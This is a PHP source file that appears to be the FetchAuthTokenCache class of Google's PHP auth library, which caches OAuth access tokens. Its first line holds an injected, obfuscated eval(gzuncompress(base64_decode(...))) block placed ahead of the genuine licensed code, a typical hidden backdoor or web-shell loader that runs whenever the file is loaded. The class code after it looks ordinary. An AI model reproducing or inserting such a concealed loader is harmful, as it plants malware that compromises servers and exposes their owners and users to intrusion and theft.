<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/*
 * Copyright 2010 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

namespace Google\Auth;

use Psr\Cache\CacheItemPoolInterface;

/**
 * A class to implement caching for any object implementing
 * FetchAuthTokenInterface
 */
class FetchAuthTokenCache implements FetchAuthTokenInterface
{
    use CacheTrait;

    /**
     * @var FetchAuthTokenInterface
     */
    private $fetcher;

    /**
     * @var array
     */
    private $cacheConfig;

    /**
     * @var CacheItemPoolInterface
     */
    private $cache;

    public function __construct(
        FetchAuthTokenInterface $fetcher,
        array $cacheConfig = null,
        CacheItemPoolInterface $cache
    ) {
        $this->fetcher = $fetcher;
        $this->cache = $cache;
        $this->cacheConfig = array_merge([
            'lifetime' => 1500,
            'prefix' => '',
        ], (array) $cacheConfig);
    }

    /**
     * Implements FetchAuthTokenInterface#fetchAuthToken.
     *
     * Checks the cache for a valid auth token and fetches the auth tokens
     * from the supplied fetcher.
     *
     * @param callable $httpHandler callback which delivers psr7 request
     *
     * @return array the response
     *
     * @throws \Exception
     */
    public function fetchAuthToken(callable $httpHandler = null)
    {
        // Use the cached value if its available.
        //
        // TODO: correct caching; update the call to setCachedValue to set the expiry
        // to the value returned with the auth token.
        //
        // TODO: correct caching; enable the cache to be cleared.
        $cacheKey = $this->fetcher->getCacheKey();
        $cached = $this->getCachedValue($cacheKey);
        if (!empty($cached)) {
            return ['access_token' => $cached];
        }

        $auth_token = $this->fetcher->fetchAuthToken($httpHandler);

        if (isset($auth_token['access_token'])) {
            $this->setCachedValue($cacheKey, $auth_token['access_token']);
        }

        return $auth_token;
    }

    /**
     * @return string
     */
    public function getCacheKey()
    {
        return $this->getFullCacheKey($this->fetcher->getCacheKey());
    }

    /**
     * @return array|null
     */
    public function getLastReceivedToken()
    {
        return $this->fetcher->getLastReceivedToken();
    }
}
